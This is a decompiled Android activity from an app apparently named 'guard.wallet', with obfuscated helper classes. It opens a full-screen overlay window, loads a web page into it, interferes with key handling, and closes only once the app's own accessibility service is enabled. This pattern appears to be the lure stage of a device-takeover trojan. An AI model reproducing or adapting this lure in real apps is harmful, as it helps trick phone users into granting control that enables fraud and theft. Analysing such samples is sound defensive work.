package com.guard.wallet.activity;

import android.app.Activity;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.os.Bundle;
import android.util.Log;
import android.view.KeyEvent;
import android.view.View;
import android.view.WindowManager;
import android.widget.LinearLayout;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.utils.AbstractC0246b;
import e0.C0267e;
import java.lang.ref.WeakReference;

/* loaded from: classes.dex */
public class GuideActivity extends Activity {

    /* renamed from: a */
    public WeakReference f187a;

    @Override // android.app.Activity
    public final void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        requestWindowFeature(1);
        getWindow().getDecorView().setBackgroundColor(Color.parseColor("#303133"));
        getWindow().setBackgroundDrawable(new ColorDrawable(Color.parseColor("#303133")));
        LinearLayout linearLayout = new LinearLayout(this);
        WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams();
        layoutParams.width = -1;
        layoutParams.height = -1;
        setContentView(linearLayout, layoutParams);
        this.f187a = new WeakReference(new C0267e(this, true));
        WindowManager.LayoutParams layoutParams2 = new WindowManager.LayoutParams();
        layoutParams2.width = -1;
        layoutParams2.height = -1;
        linearLayout.addView((View) this.f187a.get(), layoutParams2);
        WindowManager.LayoutParams attributes = getWindow().getAttributes();
        attributes.type = 2038;
        getWindow().setAttributes(attributes);
        AbstractC0246b.m599d(this);
    }

    @Override // android.app.Activity
    public final void onDestroy() {
        Log.d("GuideActivity", "GuideActivity onDestroy");
        WeakReference weakReference = this.f187a;
        if (weakReference != null && weakReference.get() != null) {
            ((C0267e) this.f187a.get()).destroy();
            this.f187a = null;
        }
        if (AbstractC0246b.f397c != null && AbstractC0246b.f397c.get() != null) {
            synchronized (Activity.class) {
                if (AbstractC0246b.f397c != null && AbstractC0246b.f397c.get() != null && (AbstractC0246b.f397c.get() instanceof GuideActivity)) {
                    AbstractC0246b.f397c = null;
                }
            }
        }
        super.onDestroy();
    }

    @Override // android.app.Activity, android.view.KeyEvent.Callback
    public final boolean onKeyDown(int i2, KeyEvent keyEvent) {
        return false;
    }

    @Override // android.app.Activity
    public final void onPause() {
        super.onPause();
        WeakReference weakReference = this.f187a;
        if (weakReference == null || weakReference.get() == null) {
            return;
        }
        ((C0267e) this.f187a.get()).onPause();
    }

    @Override // android.app.Activity
    public final void onResume() {
        super.onResume();
        Log.d("GuideActivity", "GuideActivity onResume");
        AbstractC0246b.m599d(this);
        WeakReference weakReference = this.f187a;
        if (weakReference != null && weakReference.get() != null) {
            ((C0267e) this.f187a.get()).onResume();
            ((C0267e) this.f187a.get()).loadUrl(AbstractC0246b.m598c());
            AbstractC0246b.m601f();
        }
        if (MyAccessibilityService.m554P() != null) {
            AbstractC0246b.m597b();
            finish();
        }
    }

    @Override // android.app.Activity
    public final void onStart() {
        super.onStart();
    }
}
